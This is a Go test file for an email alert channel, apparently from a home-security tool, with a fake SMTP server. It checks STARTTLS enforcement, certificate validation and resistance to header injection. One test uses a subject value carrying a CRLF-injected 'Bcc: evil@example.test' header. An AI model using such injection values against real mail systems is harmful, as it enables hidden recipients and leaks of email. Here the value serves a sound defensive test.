		cmd := strings.ToUpper(strings.TrimSpace(line))
		switch {
		case strings.HasPrefix(cmd, "EHLO"):
			if s.cert != nil && !secure {
				write("250-fake")
				write("250 STARTTLS")
			} else {
				write("250-fake")
				write("250 AUTH PLAIN")
			}
		case cmd == "STARTTLS":
			write("220 go ahead")
			tc := tls.Server(conn, &tls.Config{Certificates: []tls.Certificate{*s.cert}})
			if err := tc.Handshake(); err != nil {
				return
			}
			conn, secure = tc, true
			r = bufio.NewReader(conn)
		case strings.HasPrefix(cmd, "AUTH"):
			s.mu.Lock()
			s.authedIn = "clear"
			if secure {
				s.authedIn = "tls"
			}
			s.mu.Unlock()
			write("235 ok")
		case strings.HasPrefix(cmd, "MAIL FROM"):
			s.mu.Lock()
			s.mailFrom = strings.TrimSpace(line)
			s.mu.Unlock()
			write("250 ok")
		case strings.HasPrefix(cmd, "RCPT TO"):
			s.mu.Lock()
			s.rcpt = append(s.rcpt, strings.TrimSpace(line))
			s.mu.Unlock()
			write("250 ok")
		case cmd == "DATA":
			write("354 go")
			var b strings.Builder
			for {
				l, err := r.ReadString('\n')
				if err != nil || l == ".\r\n" {
					break
				}
				b.WriteString(l)
			}
			s.mu.Lock()
			s.data = b.String()
			s.mu.Unlock()
			write("250 ok")
		case cmd == "QUIT":
			write("221 bye")
			return
		default:
			write("250 ok")
		}
	}
}

func TestEmailOverSTARTTLS(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	cert, pool := newTestCert(t)
	f.svc.smtpTLS = func(host string) *tls.Config {
		return &tls.Config{ServerName: host, RootCAs: pool, MinVersion: tls.VersionTLS12}
	}
	srv := startSMTP(t, &cert)
	c := Channel{Kind: KindEmail, SMTPHost: "localhost", SMTPPort: srv.port(), SMTPUser: "me", Password: "pw",
		From: "HomeXDR <xdr@example.test>", To: "a@example.test, b@example.test"}
	m := Message{Title: "[HIGH] Ünusual thing on tower", Body: "Line one\n.line starting with a dot\n" + strings.Repeat("long ", 60), Link: "https://xdr.example.test/alerts/a1"}
	if err := f.svc.send(ctx, c, m); err != nil {
		t.Fatal(err)
	}
	srv.mu.Lock()
	defer srv.mu.Unlock()
	if srv.authedIn != "tls" {
		t.Fatalf("auth happened in the %q", srv.authedIn)
	}
	if len(srv.rcpt) != 2 || !strings.Contains(srv.mailFrom, "xdr@example.test") {
		t.Fatalf("envelope: %q %v", srv.mailFrom, srv.rcpt)
	}
	parsed, err := mail.ReadMessage(strings.NewReader(srv.data))
	if err != nil {
		t.Fatalf("not a valid message: %v\n%s", err, srv.data)
	}
	if subj, _ := new(mime.WordDecoder).DecodeHeader(parsed.Header.Get("Subject")); subj != m.Title {
		t.Fatalf("subject: %q", subj)
	}
	body, err := io.ReadAll(quotedprintable.NewReader(parsed.Body))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), "Line one") || !strings.Contains(string(body), m.Link) {
		t.Fatalf("body: %q", body)
	}

	// The wrong certificate is refused.
	f.svc.smtpTLS = nil
	if err := f.svc.send(ctx, c, m); err == nil {
		t.Fatal("an untrusted certificate was accepted")
	}
}

func TestEmailRefusesWithoutSTARTTLS(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	srv := startSMTP(t, nil) // offers no STARTTLS
	c := Channel{Kind: KindEmail, SMTPHost: "localhost", SMTPPort: srv.port(), SMTPUser: "me", Password: "pw-secret",
		From: "xdr@example.test", To: "a@example.test"}
	err := f.svc.send(ctx, c, Message{Title: "t", Body: "b"})
	if err == nil || !strings.Contains(err.Error(), "STARTTLS") {
		t.Fatalf("want a refusal, got %v", err)
	}
	srv.mu.Lock()
	defer srv.mu.Unlock()
	if srv.authedIn != "" || srv.data != "" {
		t.Fatalf("sent in the clear: auth=%q data=%q", srv.authedIn, srv.data)
	}
}

func TestEmailSubjectCannotInjectHeaders(t *testing.T) {
	from, _ := mail.ParseAddress("xdr@example.test")
	to, _ := mail.ParseAddressList("a@example.test")
	raw := buildEmail(from, to, Message{Title: "x\r\nBcc: evil@example.test", Body: "b"})
	parsed, err := mail.ReadMessage(strings.NewReader(string(raw)))
	if err != nil {
		t.Fatal(err)
	}
	if parsed.Header.Get("Bcc") != "" {
		t.Fatalf("a header was injected: %v", parsed.Header)
	}
}
